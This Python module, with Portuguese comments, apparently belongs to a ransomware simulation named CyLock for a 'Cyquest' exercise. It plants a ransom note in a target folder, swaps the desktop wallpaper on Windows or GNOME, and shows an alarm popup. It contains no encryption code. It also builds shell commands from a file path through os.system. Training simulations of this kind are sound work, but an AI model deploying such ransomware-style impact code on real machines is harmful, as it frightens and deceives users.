import os
import base64
import ctypes
import platform
import tkinter as tk
from tkinter import messagebox
from pathlib import Path

# Logo Cylock
LOGO_CYLOCK_B64 = "" 

def alterar_wallpaper_sistema(caminho_imagem):
    #Detecta o SO e aplica o papel de parede correspondente.
    sistema = platform.system().lower()
    caminho_absoluto = os.path.abspath(caminho_imagem)

    try:
        if sistema == "windows":
            # SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(20, 0, caminho_absoluto, 3)

        elif sistema == "linux":
            # Comandos para GNOME (Ubuntu, Debian, Fedora)
            cmd_light = f"gsettings set org.gnome.desktop.background picture-uri 'file://{caminho_absoluto}'"
            cmd_dark = f"gsettings set org.gnome.desktop.background picture-uri-dark 'file://{caminho_absoluto}'"
            
            os.system(cmd_light)
            os.system(cmd_dark)
            
        else:
            print(f"[-] Sistema {sistema} não suportado para troca automática de wallpaper.")
            
    except Exception as e:
        print(f"[-] Erro ao aplicar wallpaper: {e}")

def injetar_impacto_visual(caminho_base):    
    # 1. Criar a Nota de Resgate no diretório alvo
    caminho_nota = os.path.join(caminho_base, "LEIA_ME_CYLOCK.txt")
    try:
        with open(caminho_nota, "w", encoding="utf-8") as f:
            f.write(
                "--- CYQUEST ---\n\n"
                "SISTEMA COMPROMETIDO.\n"
                "Seus arquivos foram processados.\n"
                "Consulte o manual da liga para os procedimentos de recuperação."
            )
        print(f"[+] Nota de resgate plantada em: {caminho_nota}")
    except Exception as e:
        print(f"[-] Erro ao criar nota de resgate: {e}")

    # 2. Reconstruir a Imagem da Logo (Injeção via Base64)
    # Define pasta temporária dependendo do SO
    pasta_temp = os.environ.get('TEMP', '/tmp')
    caminho_temp_img = os.path.join(pasta_temp, 'cylock_bg.jpg')
    
    try:
        img_data = base64.b64decode(LOGO_CYLOCK_B64)
        with open(caminho_temp_img, 'wb') as f:
            f.write(img_data)
        
        # 3. Dispara a alteração do Wallpaper
        alterar_wallpaper_sistema(caminho_temp_img)
        
    except Exception as e:
        print(f"[-] Erro na injeção da imagem: {e}")

#Transmite o Pop up
def disparar_popup():
    root = tk.Tk()
    root.withdraw() 
    messagebox.showwarning(
        "CyLock: Cyquest",
        "O papel de parede foi alterado e a nota de resgate foi gerada no diretório alvo."
    )
    root.destroy()